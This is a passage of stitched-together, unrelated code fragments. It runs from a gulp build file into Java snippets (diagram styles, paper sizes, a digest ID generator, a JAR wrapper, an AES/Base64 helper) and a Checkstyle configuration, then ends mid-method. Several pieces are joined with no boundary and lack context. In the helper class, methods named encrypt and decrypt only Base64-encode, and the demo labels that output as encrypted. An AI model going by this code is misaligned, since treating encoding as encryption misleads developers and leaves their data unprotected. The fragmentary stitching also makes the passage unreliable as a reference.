    'node_modules/ng-file-upload/dist/ng-file-upload.min.js',
    'node_modules/angular-recaptcha/release/angular-recaptcha.min.js',
    'node_modules/angular-file-saver/dist/angular-file-saver.bundle.min.js'
];

const csslib = [
    'node_modules/angular-material/angular-material.min.css',
    'node_modules/angular-material-data-table/dist/md-data-table.min.css',
    'node_modules/angular-loading-bar/build/loading-bar.min.css'
];

gulp.task('source-concat', function() {
    return gulp.src(jslib)
        .pipe(newer(staticDir + 'javascript/source.min.js'))
        .pipe(concat('source.min.js'))
        .pipe(uglify())
        .pipe(gulp.dest(staticDir + 'javascript/'))
});

gulp.task('design-concat', function() {
    return gulp.src(csslib)
        .pipe(newer(staticDir + 'stylesheets/design.min.css'))
        .pipe(concat('design.min.css'))
        .pipe(cleanCSS())
        .pipe(gulp.dest(staticDir + 'stylesheets/'))
});

gulp.task('app-concat', function () {
    return gulp.src([
        webAppDir + 'app.js',
        webAppDir + 'app/**/*.js',
        webAppDir + 'directives/**/*.js',
        webAppDir + 'services/**/*.js',
        webAppDir + 'translations/**/*.js'
    ])
        .pipe(newer(staticDir + 'javascript/application.min.js'))
        .pipe(concat('application.min.js'))
        .pipe(ngAnnotate())
        .pipe(uglify())
        .pipe(gulp.dest(staticDir + 'javascript/'))
});

gulp.task('css-concat', function () {
    return gulp.src([webAppDir + '**/*.css'])
        .pipe(newer(staticDir + 'stylesheets/main.min.css'))
        .pipe(concat('main.min.css'))
        .pipe(cleanCSS())
        .pipe(gulp.dest(staticDir + 'stylesheets/'))
});

gulp.task('template-concat', function () {
    return gulp.src([
        webAppDir + '/**/*.html'
    ])
        .pipe(htmlmin({collapseWhitespace: true}))
        .pipe(templateCache({
            module:'templates',
            standalone: true,
            filename: "templates.min.js"
        }))
        .pipe(gulp.dest(staticDir + 'javascript/'));
});

gulp.task('default', ['source-concat', 'design-concat', 'app-concat', 'css-concat', 'template-concat']);

gulp.task('watch', function() {
    gulp.watch(webAppDir + '**/*.js', ['app-concat']);
    gulp.watch(webAppDir + '**/*.html', ['template-concat']);
    gulp.watch(webAppDir + '**/*.css', ['css-concat']);
});





        queries.put("HSQL Database Engine",
            "SELECT COUNT(*) FROM INFORMATION_SCHEMA.SYSTEM_USERS");
        queries.put("Oracle", "SELECT 'Hello' from DUAL");
        queries.put("Apache Derby", "SELECT 1 FROM SYSIBM.SYSDUMMY1");
        queries.put("MySQL", "SELECT 1");
        queries.put("PostgreSQL", "SELECT 1");
        queries.put("Microsoft SQL Server", "SELECT 1");
----------------------------------------------------------------------------------------
List<String> toRemove = Arrays.asList("1", "2", "3");
String text = "Hello 1 2 3";
text=toRemove.stream()
             .map(toRem-> (Function<String,String>)s->s.replaceAll(toRem, ""))
             .reduce(Function.identity(), Function::andThen)
             .apply(text);
----------------------------------------------------------------------------------------
import com.structurizr.model.Element;
import com.structurizr.model.Relationship;
import com.structurizr.util.StringUtils;

import java.util.Collection;
import java.util.LinkedList;

public final class Styles {

    private Collection<ElementStyle> elements = new LinkedList<>();
    private Collection<RelationshipStyle> relationships = new LinkedList<>();

    public Collection<ElementStyle> getElements() {
        return elements;
    }

    public void add(ElementStyle elementStyle) {
        if (elementStyle != null) {
            this.elements.add(elementStyle);
        }
    }

    public ElementStyle addElementStyle(String tag) {
        ElementStyle elementStyle = null;

        if (tag != null) {
            if (elements.stream().anyMatch(es -> es.getTag().equals(tag))) {
                throw new IllegalArgumentException("An element style for the tag \"" + tag + "\" already exists.");
            }

            elementStyle = new ElementStyle();
            elementStyle.setTag(tag);
            add(elementStyle);
        }

        return elementStyle;
    }

    /**
     * Removes all element styles.
     */
    public void clearElementStyles() {
        this.elements = new LinkedList<>();
    }

    /**
     * Removes all relationship styles.
     */
    public void clearRelationshipStyles() {
        this.relationships = new LinkedList<>();
    }

    public Collection<RelationshipStyle> getRelationships() {
        return relationships;
    }

    public void add(RelationshipStyle relationshipStyle) {
        if (relationshipStyle != null) {
            this.relationships.add(relationshipStyle);
        }
    }

    public RelationshipStyle addRelationshipStyle(String tag) {
        RelationshipStyle relationshipStyle = null;

        if (tag != null) {
            if (relationships.stream().anyMatch(rs -> rs.getTag().equals(tag))) {
                throw new IllegalArgumentException("A relationship style for the tag \"" + tag + "\" already exists.");
            }

            relationshipStyle = new RelationshipStyle();
            relationshipStyle.setTag(tag);
             add(relationshipStyle);
        }

        return relationshipStyle;
    }

    private ElementStyle findElementStyle(String tag) {
        if (tag != null) {
            for (ElementStyle elementStyle : elements) {
                if (elementStyle != null && elementStyle.getTag().equals(tag)) {
                    return elementStyle;
                }
            }
        }

        return null;
    }

    private RelationshipStyle findRelationshipStyle(String tag) {
        if (tag != null) {
            for (RelationshipStyle relationshipStyle : relationships) {
                if (relationshipStyle != null && relationshipStyle.getTag().equals(tag)) {
                    return relationshipStyle;
                }
            }
        }

        return null;
    }

    public ElementStyle findElementStyle(Element element) {
        ElementStyle style = new ElementStyle("").background("#dddddd").color("#000000").shape(Shape.Box);

        if (element != null) {
            for (String tag : element.getTagsAsSet()) {
                ElementStyle elementStyle = findElementStyle(tag);
                if (elementStyle != null) {
                    if (!StringUtils.isNullOrEmpty(elementStyle.getBackground())) {
                        style.setBackground(elementStyle.getBackground());
                    }

                    if (!StringUtils.isNullOrEmpty(elementStyle.getColor())) {
                        style.setColor(elementStyle.getColor());
                    }

                    if (!StringUtils.isNullOrEmpty(elementStyle.getStroke())) {
                        style.setStroke(elementStyle.getStroke());
                    }

                    if (elementStyle.getShape() != null) {
                        style.setShape(elementStyle.getShape());
                    }
                }
            }
        }

        return style;
    }

    public RelationshipStyle findRelationshipStyle(Relationship relationship) {
        RelationshipStyle style = new RelationshipStyle("").color("#707070");

        if (relationship != null) {
            for (String tag : relationship.getTagsAsSet()) {
                RelationshipStyle relationshipStyle = findRelationshipStyle(tag);
                if (relationshipStyle != null) {
                    if (relationshipStyle.getColor() != null && relationshipStyle.getColor().trim().length() > 0) {
                        style.setColor(relationshipStyle.getColor());
                    }
                }
            }
        }

        return style;
    }

}

/**
 * These represent paper sizes in pixels at 300dpi.
 */
public enum PaperSize {

    A6_Portrait("A6", Orientation.Portrait, 1240, 1748),
    A6_Landscape("A6", Orientation.Landscape, 1748, 1240),

    A5_Portrait("A5", Orientation.Portrait, 1748, 2480),
    A5_Landscape("A5", Orientation.Landscape, 2480, 1748),

    A4_Portrait("A4", Orientation.Portrait, 2480, 3508),
    A4_Landscape("A4", Orientation.Landscape, 3508, 2480),

    A3_Portrait("A3", Orientation.Portrait, 3508, 4961),
    A3_Landscape("A3", Orientation.Landscape, 4961, 3508),

    A2_Portrait("A2", Orientation.Portrait, 4961, 7016),
    A2_Landscape("A2", Orientation.Landscape, 7016, 4961),

    Letter_Portrait("Letter", Orientation.Portrait, 2550, 3300),
    Letter_Landscape("Letter", Orientation.Landscape, 3300, 2550),

    Legal_Portrait("Legal", Orientation.Portrait, 2550, 4200),
    Legal_Landscape("Legal", Orientation.Landscape, 4200, 2550),

    Slide_4_3("Slide 4:3", Orientation.Landscape, 3306, 2480),
    Slide_16_9("Slide 16:9", Orientation.Landscape, 3508, 1973);

    private String name;
    private Orientation orientation;
    private int width;
    private int height;

    private PaperSize(String name, Orientation orientation, int width, int height) {
        this.name = name;
        this.orientation = orientation;
        this.width = width;
        this.height = height;
    }

    public String getName() {
        return name;
    }

    public Orientation getOrientation() {
        return orientation;
    }

    public int getWidth() {
        return width;
    }

    public int getHeight() {
        return height;
    }

    enum Orientation {
        Portrait,
        Landscape
    }

}
----------------------------------------------------------------------------------------
import java.nio.charset.Charset;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import static java.lang.Math.min;

/**
 * An ID generator that uses a digest function when generating IDs for model elements and relationships.
 * This allows IDs to be more stable than a sequential number, and allows models to be merged more easily.
 */
public class MessageDigestIdGenerator implements IdGenerator {

    private static final Charset UTF8 = Charset.forName("UTF-8");
    private static final char[] HEX_CHARS = "0123456789abcdef".toCharArray();

    public static MessageDigestIdGenerator getInstance(final String algorithm) {
        return getInstance(algorithm, Integer.MAX_VALUE);
    }

    public static MessageDigestIdGenerator getInstance(final String algorithm, final int length) {
        try {
            return new MessageDigestIdGenerator(MessageDigest.getInstance(algorithm), length);
        } catch (NoSuchAlgorithmException e) {
            throw new IllegalArgumentException("Unknown algorithm: " + algorithm, e);
        }
    }

    private final MessageDigest digest;
    private final int length;

    public MessageDigestIdGenerator(final MessageDigest digest, final int length) {
        this.digest = digest;
        this.length = length;
    }

    @Override
    public void found(String id) {
        // nothing to do
    }

    @Override
    public String generateId(Element element) {
        return generateId(
                element.getCanonicalName());
    }

    @Override
    public String generateId(Relationship relationship) {
        return generateId(
                relationship.getSource().getCanonicalName(),
                relationship.getDescription(),
                relationship.getDestination().getCanonicalName());
    }

    public synchronized String generateId(final String...terms) {
        digest.reset();
        for (final String term : terms) {
            if(term!=null) {
                digest.update(term.getBytes(UTF8));
            }
        }

        final byte[] bytes = this.digest.digest();
        final char[] chars = new char[min(bytes.length * 2, this.length)];

        int b=0, c=0;
        while(b < bytes.length && c < chars.length) {
            int value = bytes[b++] & 0xFF;
            chars[c++] = HEX_CHARS[value >>> 4];
            if(c < chars.length) {
                chars[c++] = HEX_CHARS[value & 0x0F];
            }
        }
        return new String(chars);
    }
}
----------------------------------------------------------------------------------------
import java.io.Closeable;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Collections;
import java.util.Enumeration;
import java.util.LinkedHashMap;
import java.util.jar.JarEntry;
import java.util.jar.JarFile;
import java.util.jar.JarInputStream;
import java.util.jar.Manifest;
import java.util.zip.ZipEntry;
import java.util.zip.ZipFile;

/*
* A universal random access interface for both JarFile and JarInputStream
*
* In the case when JarInputStream is provided to constructor, the whole stream
* will be loaded into memory for random access purposes.
* On the other hand, when a JarFile is provided, it simply works as a wrapper.
* */

public class JarMap implements Closeable, AutoCloseable {

    private JarFile jarFile;
    private JarInputStream jis;
    private LinkedHashMap<String, JarEntry> bufMap;
    private Manifest manifest;

    public JarMap(File file) throws IOException {
        this(file, true);
    }

    public JarMap(File file, boolean verify) throws IOException {
        this(file, verify, ZipFile.OPEN_READ);
    }

    public JarMap(File file, boolean verify, int mode) throws IOException {
        jarFile = new JarFile(file, verify, mode);
        manifest = jarFile.getManifest();
    }

    public JarMap(String name) throws IOException {
        this(new File(name));
    }

    public JarMap(String name, boolean verify) throws IOException {
        this(new File(name), verify);
    }

    public JarMap(InputStream is) throws IOException {
        this(is, true);
    }

    public JarMap(InputStream is, boolean verify) throws IOException {
        jis = new JarInputStream(is, verify);
        bufMap = new LinkedHashMap<>();
        JarEntry entry;
        while ((entry = jis.getNextJarEntry()) != null) {
            bufMap.put(entry.getName(), new JarMapEntry(entry, jis));
        }
        manifest = jis.getManifest();
    }

    public File getFile() {
        return jarFile == null ? null : new File(jarFile.getName());
    }

    public Manifest getManifest() {
        return manifest;
    }

    public InputStream getInputStream(ZipEntry ze) throws IOException {
        if (bufMap != null) {
            JarMapEntry e = (JarMapEntry) bufMap.get(ze.getName());
            if (e != null)
                return e.data.getInputStream();
        }
        return jarFile.getInputStream(ze);
    }

    public OutputStream getOutputStream(ZipEntry ze) {
        manifest = null; /* Invalidate the manifest */
        if (bufMap == null)
            bufMap = new LinkedHashMap<>();
        JarMapEntry e = new JarMapEntry(ze.getName());
        bufMap.put(ze.getName(), e);
        return e.data;
    }

    public byte[] getRawData(ZipEntry ze) throws IOException {
        if (bufMap != null) {
            JarMapEntry e = (JarMapEntry) bufMap.get(ze.getName());
            if (e != null)
                return e.data.toByteArray();
        }
        ByteArrayStream bytes = new ByteArrayStream();
        bytes.readFrom(jarFile.getInputStream(ze));
        return bytes.toByteArray();
    }

    public Enumeration<JarEntry> entries() {
        return jarFile == null ? Collections.enumeration(bufMap.values()) : jarFile.entries();
    }

    public ZipEntry getEntry(String name) {
        return getJarEntry(name);
    }

    public JarEntry getJarEntry(String name) {
        JarEntry e = jarFile == null ? bufMap.get(name) : jarFile.getJarEntry(name);
        if (e == null && bufMap != null)
            return bufMap.get(name);
        return e;
    }

    @Override
    public void close() throws IOException {
        (jarFile == null ? jis : jarFile).close();
    }

    private static class JarMapEntry extends JarEntry {
        ByteArrayStream data;

        JarMapEntry(JarEntry je, InputStream is) {
            super(je);
            data = new ByteArrayStream();
            data.readFrom(is);
        }

        JarMapEntry(String s) {
            super(s);
            data = new ByteArrayStream();
        }
    }
}
----------------------------------------------------------------------------------------
public class FooParameterResolver implements ParameterResolver {
  @Override
  public boolean supportsParameter(ParameterContext parameterContext, 
    ExtensionContext extensionContext) throws ParameterResolutionException {
      return parameterContext.getParameter().getType() == Foo.class;
  }
 
  @Override
  public Object resolveParameter(ParameterContext parameterContext, 
    ExtensionContext extensionContext) throws ParameterResolutionException {
      return new Foo();
  }
}
https://www.baeldung.com/junit-5-parameters

    @Override
    public void configureContentNegotiation(ContentNegotiationConfigurer configurer) {
        configurer.mediaType("adoc", MediaType.parseMediaType("text/asciidoc;charset=utf-8"))
                .mediaType("md", MediaType.parseMediaType("text/markdown;charset=utf-8"))
                .mediaType("html", MediaType.parseMediaType("text/html;charset=utf-8"))
                .mediaType("properties", MediaType.parseMediaType("text/properties;charset=utf-8"))
                .mediaType("yml", MediaType.parseMediaType("text/yaml;charset=utf-8"))
                .mediaType("sql", MediaType.parseMediaType(MediaType.TEXT_PLAIN_VALUE + ";charset=utf-8"))
                .mediaType("jdl", MediaType.parseMediaType(MediaType.TEXT_PLAIN_VALUE + ";charset=utf-8"))
                .mediaType("doc", MediaType.parseMediaType("application/msword"));
        super.configureContentNegotiation(configurer);
    }

public class ProductionDogeRepository implements DogeRepository {

    @Override
    public String getDogeData() {
        StringBuffer doge = new StringBuffer();
        doge.append("░░░░░░░░░▄░░░░░░░░░░░░░░▄").append("\n");
        doge.append("░░░░░░░░▌▒█░░░░░░░░░░░▄▀▒▌").append("\n");
        doge.append("░░░░░░░░▌▒▒█░░░░░░░░▄▀▒▒▒▐").append("\n");
        doge.append("░░░░░░░▐▄▀▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐").append("\n");
        doge.append("░░░░░▄▄▀▒░▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐").append("\n");
        doge.append("░░░▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌").append("\n");
        doge.append("░░▐▒▒▒▄▄▒▒▒▒░░░▒▒▒▒▒▒▒▀▄▒▒▌").append("\n");
        doge.append("░░▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐").append("\n");
        doge.append("░▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌").append("\n");
        doge.append("░▌░▒▄██▄▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌").append("\n");
        doge.append("▌▒▀▐▄█▄█▌▄░▀▒▒░░░░░░░░░░▒▒▒▐").append("\n");
        doge.append("▐▒▒▐▀▐▀▒░▄▄▒▄▒▒▒▒▒▒░▒░▒░▒▒▒▒▌").append("\n");
        doge.append("▐▒▒▒▀▀▄▄▒▒▒▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▐").append("\n");
        doge.append("░▌▒▒▒▒▒▒▀▀▀▒▒▒▒▒▒░▒░▒░▒░▒▒▒▌").append("\n");
        doge.append("░▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▄▒▒▐").append("\n");
        doge.append("░░▀▄▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▄▒▒▒▒▌").append("\n");
        doge.append("░░░░▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀").append("\n");
        doge.append("░░░░░░▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀").append("\n");
        doge.append("░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▀▀");
        return doge.toString();
    }
}
----------------------------------------------------------------------------------------
import java.util.Locale;

import android.text.TextUtils;

public class Utils {
	public static String bytesToHexString(byte[] src) {
		StringBuilder stringBuilder = new StringBuilder();
		if (src != null && src.length > 0) {
			for (int i = 0; i < src.length; i++) {
				int hex = src[i] & 0xFF;
				String hexStr = Integer.toHexString(hex);
				if (hexStr.length() < 2) {
					stringBuilder.append(0);
				}
				stringBuilder.append(hexStr);
			}
			return stringBuilder.toString();
		} else
			return null;
	}

	public static byte[] hexStringToBytes(String hexString) {
		byte[] bs = null;
		if (!TextUtils.isEmpty(hexString)) {
			bs = new byte[hexString.length() / 2];
			char[] hexChars = hexString.toUpperCase(Locale.getDefault()).toCharArray();
			for (int i = 0; i < bs.length; i++) {
				bs[i] = (byte) ((byte) "0123456789ABCDEF".indexOf(hexChars[i * 2]) << 4 | (byte) "0123456789ABCDEF"
						.indexOf(hexChars[i * 2 + 1]));
			}
		}
		return bs;
	}
}


import org.apache.commons.codec.binary.Base64;

import java.security.Key;
import java.security.SecureRandom;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

public class EncryptorUtils {
    public static final String ALGORITHM = "AES";

    public static byte[] decrypt(String key)  {
        return Base64.decodeBase64(key);
    }

    public static String encrypt(byte[] key)  {
        return Base64.encodeBase64String(key);
    }

    public static byte[] decryptBASE64(String key) throws Exception {
        return Base64.decodeBase64(key);
    }

    public static String encryptBASE64(byte[] key) throws Exception {
        return Base64.encodeBase64String(key);
    }

    private static Key toKey(byte[] key) throws Exception {
        //DESKeySpec dks = new DESKeySpec(key);
        //SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(ALGORITHM);
        //SecretKey secretKey = keyFactory.generateSecret(dks);

        // 当使用其他对称加密算法时，如AES、Blowfish等算法时，用下述代码替换上述三行代码
        SecretKey secretKey = new SecretKeySpec(key, ALGORITHM);

        return secretKey;
    }

    public static byte[] decrypt(byte[] data, String key) throws Exception {
        Key k = toKey(decryptBASE64(key));

        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.DECRYPT_MODE, k);

        return cipher.doFinal(data);
    }

    public static byte[] encrypt(byte[] data, String key) throws Exception {
        Key k = toKey(decryptBASE64(key));
        Cipher cipher = Cipher.getInstance(ALGORITHM);
        cipher.init(Cipher.ENCRYPT_MODE, k);

        return cipher.doFinal(data);
    }

    public static String initKey() throws Exception {
        return initKey(null);
    }

    public static String initKey(String seed) throws Exception {
        SecureRandom secureRandom = null;

        if (seed != null) {
            secureRandom = new SecureRandom(decryptBASE64(seed));
        } else {
            secureRandom = new SecureRandom();
        }

        KeyGenerator kg = KeyGenerator.getInstance(ALGORITHM);
        kg.init(secureRandom);

        SecretKey secretKey = kg.generateKey();

        return encryptBASE64(secretKey.getEncoded());
    }


    public static void main(String[] args) throws Exception {
        String[] vals = new String[]{"test","test@123"};
        for (String source : vals) {
            System.out.println("原文: " + source);
            String encryptData = encrypt(source.getBytes());
            System.out.println("加密后: " + encryptData);
            String decryptData = new String(decrypt(encryptData));
            System.out.println("解密后: " + decryptData);
        }
    }
}
----------------------------------------------------------------------------------------
<?xml version="1.0"?>
<!--

    Copyright 2017 The OpenTracing Authors

    Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except
    in compliance with the License. You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software distributed under the License
    is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express
    or implied. See the License for the specific language governing permissions and limitations under
    the License.

-->

<!--
    Checkstyle configuration that checks the Google coding conventions from Google Java Style
    that can be found at https://google.github.io/styleguide/javaguide.html.

    Checkstyle is very configurable. Be sure to read the documentation at
    http://checkstyle.sf.net (or in your downloaded distribution).

    To completely disable a check, just comment it out or delete it from the file.

    Authors: Max Vetrenko, Ruslan Diachenko, Roman Ivanov.
 -->
<!DOCTYPE module PUBLIC
  "-//Puppy Crawl//DTD Check Configuration 1.3//EN"
  "http://checkstyle.sourceforge.net/dtds/configuration_1_3.dtd">

<module name="Checker">
  <property name="charset" value="UTF-8"/>

  <property name="fileExtensions" value="java, properties, xml"/>
  <!-- Checks for whitespace                               -->
  <!-- See http://checkstyle.sf.net/config_whitespace.html -->
  <module name="FileTabCharacter">
    <property name="eachLine" value="true"/>
  </module>

  <module name="TreeWalker">
    <module name="OuterTypeFilename"/>
    <module name="IllegalTokenText">
      <property name="tokens" value="STRING_LITERAL, CHAR_LITERAL"/>
      <property name="format"
        value="\\u00(09|0(a|A)|0(c|C)|0(d|D)|22|27|5(C|c))|\\(0(10|11|12|14|15|42|47)|134)"/>
      <property name="message"
        value="Consider using special escape sequence instead of octal value or Unicode escaped value."/>
    </module>
    <module name="AvoidEscapedUnicodeCharacters">
      <property name="allowEscapesForControlCharacters" value="true"/>
      <property name="allowByTailComment" value="true"/>
      <property name="allowNonPrintableEscapes" value="true"/>
    </module>
    <!--module name="LineLength">
      <property name="max" value="100"/>
      <property name="ignorePattern"
        value="^package.*|^import.*|a href|href|http://|https://|ftp://"/>
    </module-->
    <module name="AvoidStarImport"/>
    <!--module name="OneTopLevelClass"/-->
    <module name="NoLineWrap"/>
    <module name="EmptyBlock">
      <property name="option" value="TEXT"/>
      <property name="tokens"
        value="LITERAL_TRY, LITERAL_FINALLY, LITERAL_IF, LITERAL_ELSE, LITERAL_SWITCH"/>
    </module>
    <module name="NeedBraces"/>
    <module name="LeftCurly"/>
    <module name="RightCurly">
      <property name="id" value="RightCurlySame"/>
      <property name="tokens"
        value="LITERAL_TRY, LITERAL_CATCH, LITERAL_FINALLY, LITERAL_IF, LITERAL_ELSE, LITERAL_DO"/>
    </module>
    <module name="RightCurly">
      <property name="id" value="RightCurlyAlone"/>
      <property name="option" value="alone"/>
      <property name="tokens"
        value="CLASS_DEF, METHOD_DEF, CTOR_DEF, LITERAL_FOR, LITERAL_WHILE, STATIC_INIT, INSTANCE_INIT"/>
    </module>
    <module name="WhitespaceAround">
      <property name="allowEmptyConstructors" value="true"/>
      <property name="allowEmptyMethods" value="true"/>
      <property name="allowEmptyTypes" value="true"/>
      <property name="allowEmptyLoops" value="true"/>
      <message key="ws.notFollowed"
        value="WhitespaceAround: ''{0}'' is not followed by whitespace. Empty blocks may only be represented as '{}' when not part of a multi-block statement (4.1.3)"/>
      <message key="ws.notPreceded"
        value="WhitespaceAround: ''{0}'' is not preceded with whitespace."/>
    </module>
    <module name="OneStatementPerLine"/>
    <module name="MultipleVariableDeclarations"/>
    <module name="ArrayTypeStyle"/>
    <module name="MissingSwitchDefault"/>
    <module name="FallThrough"/>
    <module name="UpperEll"/>
    <module name="ModifierOrder"/>
    <!--module name="EmptyLineSeparator">
      <property name="allowNoEmptyLineBetweenFields" value="true"/>
    </module-->
    <module name="SeparatorWrap">
      <property name="id" value="SeparatorWrapDot"/>
      <property name="tokens" value="DOT"/>
      <property name="option" value="nl"/>
    </module>
    <module name="SeparatorWrap">
      <property name="id" value="SeparatorWrapComma"/>
      <property name="tokens" value="COMMA"/>
      <property name="option" value="EOL"/>
    </module>
    <module name="SeparatorWrap">
      <!-- ELLIPSIS is EOL until https://github.com/google/styleguide/issues/258 -->
      <property name="id" value="SeparatorWrapEllipsis"/>
      <property name="tokens" value="ELLIPSIS"/>
      <property name="option" value="EOL"/>
    </module>
    <module name="SeparatorWrap">
      <!-- ARRAY_DECLARATOR is EOL until https://github.com/google/styleguide/issues/259 -->
      <property name="id" value="SeparatorWrapArrayDeclarator"/>
      <property name="tokens" value="ARRAY_DECLARATOR"/>
      <property name="option" value="EOL"/>
    </module>
    <module name="SeparatorWrap">
      <property name="id" value="SeparatorWrapMethodRef"/>
      <property name="tokens" value="METHOD_REF"/>
      <property name="option" value="nl"/>
    </module>
    <module name="PackageName">
      <property name="format" value="^[a-z]+(\.[a-z][a-z0-9]*)*$"/>
      <message key="name.invalidPattern"
        value="Package name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="TypeName">
      <message key="name.invalidPattern"
        value="Type name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="MemberName">
      <property name="format" value="^[a-z][a-z0-9][a-zA-Z0-9]*$"/>
      <message key="name.invalidPattern"
        value="Member name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="ParameterName">
      <property name="format" value="^[a-z]([a-z0-9][a-zA-Z0-9]*)?$"/>
      <message key="name.invalidPattern"
        value="Parameter name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="CatchParameterName">
      <property name="format" value="^[a-z]([a-z0-9][a-zA-Z0-9]*)?$"/>
      <message key="name.invalidPattern"
        value="Catch parameter name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="LocalVariableName">
      <property name="tokens" value="VARIABLE_DEF"/>
      <property name="format" value="^[a-z]([a-z0-9][a-zA-Z0-9]*)?$"/>
      <message key="name.invalidPattern"
        value="Local variable name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="ClassTypeParameterName">
      <property name="format" value="(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)"/>
      <message key="name.invalidPattern"
        value="Class type name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="MethodTypeParameterName">
      <property name="format" value="(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)"/>
      <message key="name.invalidPattern"
        value="Method type name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="InterfaceTypeParameterName">
      <property name="format" value="(^[A-Z][0-9]?)$|([A-Z][a-zA-Z0-9]*[T]$)"/>
      <message key="name.invalidPattern"
        value="Interface type name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="NoFinalizer"/>
    <module name="GenericWhitespace">
      <message key="ws.followed"
        value="GenericWhitespace ''{0}'' is followed by whitespace."/>
      <message key="ws.preceded"
        value="GenericWhitespace ''{0}'' is preceded with whitespace."/>
      <message key="ws.illegalFollow"
        value="GenericWhitespace ''{0}'' should followed by whitespace."/>
      <message key="ws.notPreceded"
        value="GenericWhitespace ''{0}'' is not preceded with whitespace."/>
    </module>
    <module name="Indentation">
      <property name="basicOffset" value="2"/>
      <property name="braceAdjustment" value="0"/>
      <property name="caseIndent" value="2"/>
      <property name="throwsIndent" value="4"/>
      <property name="lineWrappingIndentation" value="4"/>
      <property name="arrayInitIndent" value="2"/>
    </module>
    <!--module name="AbbreviationAsWordInName">
      <property name="ignoreFinal" value="false"/>
      <property name="allowedAbbreviationLength" value="1"/>
    </module-->
    <module name="OverloadMethodsDeclarationOrder"/>
    <module name="VariableDeclarationUsageDistance"/>
    <module name="CustomImportOrder">
      <property name="sortImportsInGroupAlphabetically" value="true"/>
      <property name="separateLineBetweenGroups" value="true"/>
      <property name="customImportOrderRules" value="STATIC###THIRD_PARTY_PACKAGE"/>
    </module>
    <module name="MethodParamPad"/>
    <module name="NoWhitespaceBefore">
      <property name="tokens" value="COMMA, SEMI, POST_INC, POST_DEC, DOT, ELLIPSIS, METHOD_REF"/>
      <property name="allowLineBreaks" value="true"/>
    </module>
    <module name="ParenPad"/>
    <!--module name="OperatorWrap">
      <property name="option" value="NL"/>
      <property name="tokens"
        value="BAND, BOR, BSR, BXOR, DIV, EQUAL, GE, GT, LAND, LE, LITERAL_INSTANCEOF, LOR, LT, MINUS, MOD, NOT_EQUAL, PLUS, QUESTION, SL, SR, STAR, METHOD_REF "/>
    </module-->
    <module name="AnnotationLocation">
      <property name="id" value="AnnotationLocationMostCases"/>
      <property name="tokens" value="CLASS_DEF, INTERFACE_DEF, ENUM_DEF, METHOD_DEF, CTOR_DEF"/>
    </module>
    <module name="AnnotationLocation">
      <property name="id" value="AnnotationLocationVariables"/>
      <property name="tokens" value="VARIABLE_DEF"/>
      <property name="allowSamelineMultipleAnnotations" value="true"/>
    </module>
    <module name="NonEmptyAtclauseDescription"/>
    <module name="JavadocTagContinuationIndentation"/>
    <!--module name="SummaryJavadoc">
      <property name="forbiddenSummaryFragments"
        value="^@return the *|^This method returns |^A [{]@code [a-zA-Z0-9]+[}]( is a )"/>
    </module-->
    <!--module name="JavadocParagraph"/-->
    <module name="AtclauseOrder">
      <property name="tagOrder" value="@param, @return, @throws, @deprecated"/>
      <property name="target"
        value="CLASS_DEF, INTERFACE_DEF, ENUM_DEF, METHOD_DEF, CTOR_DEF, VARIABLE_DEF"/>
    </module>
    <!--module name="JavadocMethod">
      <property name="scope" value="public"/>
      <property name="allowMissingParamTags" value="true"/>
      <property name="allowMissingThrowsTags" value="true"/>
      <property name="allowMissingReturnTag" value="true"/>
      <property name="minLineCount" value="2"/>
      <property name="allowedAnnotations" value="Override, Test"/>
      <property name="allowThrowsTagsForSubclasses" value="true"/>
    </module-->
    <module name="MethodName">
      <property name="format" value="^[a-z][a-z0-9][a-zA-Z0-9_]*$"/>
      <message key="name.invalidPattern"
        value="Method name ''{0}'' must match pattern ''{1}''."/>
    </module>
    <module name="SingleLineJavadoc">
      <property name="ignoreInlineTags" value="false"/>
    </module>
    <module name="EmptyCatchBlock">
      <property name="exceptionVariableName" value="expected"/>
    </module>
    <module name="CommentsIndentation"/>
  </module>
</module>

import org.springframework.boot.autoconfigure.template.TemplateAvailabilityProvider;
import org.springframework.core.env.Environment;
import org.springframework.core.io.ResourceLoader;
import org.springframework.util.ClassUtils;

/**
 * {@link org.springframework.boot.autoconfigure.template.TemplateAvailabilityProvider} that provides availability information for
 * jade4j view templates
 *
 * @author Domingo Suarez Torres
 */
public class Jade4JTemplateAvailabilityProvider implements TemplateAvailabilityProvider {

  @Override
  public boolean isTemplateAvailable(String view, Environment environment, ClassLoader classLoader, ResourceLoader resourceLoader) {
    if (ClassUtils.isPresent("de.neuland.jade4j.spring.template.SpringTemplateLoader", classLoader)) {
